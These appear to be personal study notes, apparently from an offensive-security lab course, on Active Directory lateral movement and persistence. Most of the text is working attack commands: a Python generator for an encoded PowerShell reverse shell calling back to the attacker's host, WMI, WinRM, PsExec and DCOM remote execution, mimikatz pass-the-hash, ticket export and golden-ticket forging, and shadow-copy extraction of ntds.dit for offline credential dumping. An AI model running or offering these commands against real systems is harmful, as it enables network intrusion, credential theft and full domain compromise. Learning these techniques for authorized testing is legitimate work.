Lateral Movement in Active Directory


Active Directory Lateral Movement Techniques

WMI and WinRM

Windows Mnagement Instrucmentation, object oriented feature that facilitates task automation

WMI create process: Create method from Win32_Process::comms Remote Procedure Calls over 135 for remote and 19152-65535 for session data

wmic utility, recently deprecated

need credentials of member of the Administrators local group

UAC remote restrictions::does not apply to domain user, so we can go wild

wmic abused for lateral movement via command by specifying target IP after /node: arg and iser after /user: and password after /password:

wmic /node:<IP> /user:<username> /password:<password> process call create "<process name>"
cmd would be intresting

wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
tring to create calculator process with jen user on Files04 server

WMI job returns PID of process and a 0 meaning sucess

-> translating into powershell:
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

we have PSCredential object, we need Common Information Model via New-CimSession

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
and now we run with this

$username = '<username>';
$password = '<passowrd>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <targetIP> -Credential $credential -SessionOption $Options 
$command = '<payload>';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

python code for bsae64 encoded powershell reverse shell payload generator with escape character encoding:

import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("<myip>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

and now we run:
python3 encode.py
to get the payload

WinRM can be employed for remote management::Microsoft version of WS-Management
exchange XML over HTTP and HTTPS on port 5985 5986 respectively

winrs Windows Remote Shell:
winrs -r:<targethost> -u:<username> -p:<password> "cmd /c <payload>"

PowerShell has WinRM::PowerShell Remoting
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <targethost> -Credential $credential

and on the target host we can just 
Enter-PSSession <session ID>


PsExec

part of the SysInternals suite 

1. admin user
2. ADMIN$ avalible
3. File and Printer Sharing on

2 && 3 are default on morden windows

to RCE PsExec:
- writes psexesvc.exe into C:\Windows
- Creates a service on the remote host
- runs command as a child of psexesvc.exe

PsExec is not default on Windows

.\PsExec64.exe -i  \\<targethostname> -u <domain>\<user> -p <password> cmd
example:
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd


Pass The Hash

using user NTLM hash instead of plain text when rockyou no work

only work for NTLM using service, if Kerbereos it's not going to work

SMB -> NTLM hash

can be used to starrt windows service

Pass The Hash:
1. SMB through firewall on 445
2. Windows File and Printer Sharing
3. ADMIN$ available

need to present valid credentials with local admin permission

wmiexec from Impacket on kali

impacket-wmiexec -hashes :<hash> <user>@<ip>

only works for AC domain account and built-in local admin account


Overpass the Hash

abuse NTLM hash to gain full Kerberos TGT -> TGS

run as a different user: shift left-click "show more options" -> Run as different user

after we ran this, the credentials of the user will be cached we can see it on mimikatz

no we turn the NTLM into a kerberos ticket

mimikatz
sekurlsa::pth /user:<username> /domain:<domain>.com /ntlm:<hash> /run:powershell

example:
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

remember to only run this on the cmd opened by mimikatz to use the ticket
net use \\file04 
to get a TGT

PsExec can run command remotely, no password hash so we can run it with kerberos ticket

.\PsExec.exe \\<machine> cmd
example:
.\PsExec.exe \\files04 cmd


Pass the Ticket

TGT us tied to user session and cannont be reused, TGS can be exported and reused across system

Pass the Ticket uses the TGS, if service ticket belong to current user admin is not needed

privilege::debug
sekurlsa::tickets /export

dir *.kirbi
in the directory of mimikatz, filtering for tickets

kerberos::ptt <ticket>
example:
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi


DCOM

Distributed Component Object Model
system for creating software that interact with eachother

COM: Component Object Model: Microsoft

COM and DCOM are old tech, DCOM RPC 135 and need local admin

lateral movement technique is based on Microsoft Management Console COM application for scripted automation

MMC Application Class allows for Application Objects creation
it exposes ExecuteShellCommand method under Document.ActiveView

$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target>"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c <command>","7")


Active Directory Persistence


Golden Ticket

if we can get krbtgt password hash we can create custom TGT: golden ticket

we can create a TGT stating a normal user is a member of Domain Admins Group, if correctly encrypted dc will trust it

note that only domain admin group or member can do this

mimikatz
privilege::debug
lsadump::lsa /patch
grab the NTLM of the krbtgt account

move to normal user
kerberos::purge
to clear tickets

kerberos::golden /user:<username> /domain:<domain> /sid:<domain sid> /krbtgt:<krbtgt user hash> /ptt

example:
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt


Shadow Copies

Volume Shadow Service: ms backup solution'

ms signed binary: vshadow.exe

as domain admin: use vshadow to extract ad database ntds.dit 

we grab the SYSTEMhive from the db, and then we can extract every user's credential offline on kali

vshadow.exe -nw -p  C:
-nw for no writers for faster backup
-p to paste on disk

take note of the shadow copy device name

and we just 
copy <shadow copy device name>\windows\nntds\ntds.dit c:\ntds.dit.bak
for example:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

we need the SYSTEM hive saved to extact ntds.dit
reg.exe save hklm\system c:\system.bak

on kali:
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL